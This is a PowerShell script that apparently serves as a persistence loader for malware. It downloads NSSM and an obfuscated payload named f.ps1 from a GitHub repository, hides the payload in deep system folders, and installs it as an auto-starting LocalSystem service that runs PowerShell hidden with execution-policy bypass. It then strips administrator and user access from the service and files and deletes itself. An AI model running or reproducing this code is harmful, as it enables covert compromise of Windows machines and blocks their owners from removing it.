param(
    [string]$basePath,
    [string]$fwdPath
)
$curr = $MyInvocation.MyCommand.Path
$user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]

$paths = @(
    ($env:systemdrive+"\Users\$user\AppData\Roaming\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump"),
    ($env:systemdrive + "\Recovery"),
    "$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces",
    "$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls\5645725642"
)


$arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
if($arch -eq "64-bit"){
    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx64.exe"
}else{
    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx32.exe"
}
$nssmFolder = "$env:windir\system32\wbem\nssm"
$nssmexe = "$nssmFolder\nssm.exe"
$serviceName = "MyfwdService"
$propertyName = "fwd"
if(($fwdPath -eq $null) -or ($fwdPath -eq "")){
    $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $fwdPath = "$fwdPath\f.ps1"
    Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
}
$exepath = "powershell.exe"
$arguments = "-ep bypass -nop -w hidden $fwdPath"



if(-not(Test-Path -Path $nssmFolder -PathType Container)){
    New-Item -Path $nssmFolder -ItemType Directory -Force
}

if(-not(Test-Path -Path $nssmexe)){
    iwr -Uri $nssmUrl -OutFile $nssmexe
}

if(-not(Test-Path -Path $fwdPath)){
    iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/f.ps1" -OutFile $fwdPath
}

if(Get-Service -Name $serviceName -ErrorAction SilentlyContinue){
    & $nssmexe stop $serviceName
    & $nssmexe remove $serviceName confirm
}

& $nssmexe install $serviceName $exePath $arguments
& $nssmexe set $serviceName Start SERVICE_AUTO_START
& $nssmexe set $serviceName ObjectName "LocalSystem"
& $nssmexe set $serviceName AppExit Default Exit
& $nssmexe set $serviceName AppExit 0 Exit
& $nssmexe set $serviceName AppPriority REALTIME_PRIORITY_CLASS
& $nssmexe set $serviceName AppStdout "$env:userprofile\fwd_srv.log"
& $nssmexe set $serviceName AppStderr "$env:userprofile\fwd_srv.log.error"
& $nssmexe start $serviceName

Start-Sleep -Seconds 3
$user = (Get-CimInstance -ClassName Win32_ComputerSystem).UserName
$SDDL = "O:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
sc.exe sdset $serviceName $SDDL

takeown /F $fwdPath 2>&1 | Out-Null
icacls $fwdPath /setowner "NT AUTHORITY\SYSTEM" /Q 2>&1 | Out-Null
icacls $fwdPath /inheritance:r /Q 2>&1 | Out-Null
icacls $fwdPath /grant:r "NT AUTHORITY\SYSTEM:F" /Q 2>&1 | Out-Null
icacls $fwdPath /remove "Administrators" "Users" "Authenticated Users" "Everyone" /Q 2>&1 | Out-Null
icacls $fwdPath /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /Q 2>&1 | Out-Null
icacls $fwdPath /remove "$user" /Q 2>&1 | Out-Null



takeown /F $nssmFolder /R /D Y 2>&1 | Out-Null
icacls $nssmFolder /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /setowner "NT AUTHORITY\SYSTEM" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /inheritance:r /T /Q 2>&1 | Out-Null
icacls $nssmFolder /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /remove "$user" /T /Q 2>&1 | Out-Null

#attrib +h +s +r $nssmFolder
#attrib +h +s +r $fwdPath

Remove-Item -Path $curr -Force -ErrorAction SilentlyContinue